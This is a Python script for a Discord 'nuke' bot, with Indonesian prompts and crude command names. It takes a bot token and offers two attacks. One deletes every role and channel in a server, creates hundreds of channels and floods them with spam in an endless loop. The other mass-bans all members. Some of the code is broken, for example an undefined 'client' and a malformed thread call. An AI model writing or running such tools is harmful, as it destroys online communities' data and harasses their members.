from discord.ext import commands
import threading
import discord
import random
import os,sys
tokeninput = f'[>] BOT TOKEN: '
TOKEN = input(tokeninput)

os.system('clear')
def main():
    ()
    headers = {
      "authorization" : TOKEN
    }
os.system('clear')
print("JOIN DULU DISCORD PANTEQ")
os.system('xdg-open https://discord.gg/RrRNW4eN')
os.system('clear')
print("PILIH BANGST")
print('1) Nuke')
print('2) Ban')

MAX_CHANNELS = 500


choice = int(input())


if choice == 1:
    chanless = input('Channel Nama: ')
    spam = input('Text Untuk Spam: ')
    print('Lu ketik: !kontol')


if choice == 2:
    reason = input('Bans reason: ')
    print('Untuk Ban satu orang ketik')
    print('Lu ketik untuk banall: !bandros')


antinet = commands.Bot(command_prefix="!")

@antinet.command()
async def kontol(ctx):
    await ctx.message.delete()
    guild = ctx.guild

    for role in guild.roles:
        try:
            await role.delete()
            print(f"{role.name} Has been deleted")
        except:
            print(f"{role.name} Has not been deleted")

    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"{channel.name} Has been deleted")
        except:
            print(f'You cant delete {channel}')

    try:
        for i in range(MAX_CHANNELS):
            await guild.create_text_channel(chanless)
            print(f"{chanless} has been created")
    except:
        print('Anda belum mendapat izin untuk channel')

@antinet.command(pass_context=True)
async def bandros(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    for member in list(client.get_all_members()):
        try:
            await guild.ban(member)
            print("User " + member.name + " has been banned")
        except:
            print('Anda belum mendapat izin untuk ban')


@antinet.command()
async def bandros1(ctx, member : discord.Member):
    await ctx.message.delete()
    try:
        await member.ban(reason=reason)
        print(f'{member} was banned')
    except:
        print(f'Anda tidak memiliki izin untuk ban {member}')

@antinet.event
async def on_guild_channel_create(channel):
    while True:
        try:
            await channel.send(spam)
            print('SPAMMIMG :)')

        except:
            print('Anda Tidak Bisa Spamm')

def thread():
        threading.Thread(target=on_guild_channel_create, args=(TOKEN)).start()

antinet.run(TOKEN)

